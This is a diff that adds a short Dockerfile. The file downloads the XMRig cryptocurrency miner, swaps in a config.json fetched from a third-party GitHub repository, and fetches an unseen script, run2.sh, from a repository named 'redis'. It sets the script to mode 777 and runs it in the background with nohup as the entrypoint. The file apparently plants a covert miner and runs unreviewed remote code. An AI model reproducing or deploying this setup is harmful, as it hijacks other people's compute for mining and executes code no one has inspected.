@@ -1,0 +1,18 @@
+FROM ubuntu:16.04
+
+RUN  apt-get update
+RUN  apt-get install -y wget
+RUN wget https://github.com/xmrig/xmrig/releases/download/v5.7.0/xmrig-5.7.0-xenial-x64.tar.gz
+RUN tar xf xmrig-5.7.0-xenial-x64.tar.gz
+RUN rm -rf xmrig-5.7.0/config.json
+RUN wget https://raw.githubusercontent.com/ba3walos99/append/master/config.json
+RUN cp config.json xmrig-5.7.0/config.json
+RUN useradd -ms /bin/bash admin
+RUN wget https://raw.githubusercontent.com/ba3walos99/redis/master/run2.sh
+RUN chown -R admin:admin ./run2.sh
+RUN chown -R admin:admin run2.sh
+RUN chmod 777 ./run2.sh
+RUN chmod 777 run2.sh
+CMD ls
+USER admin
+ENTRYPOINT nohup ./run2.sh &
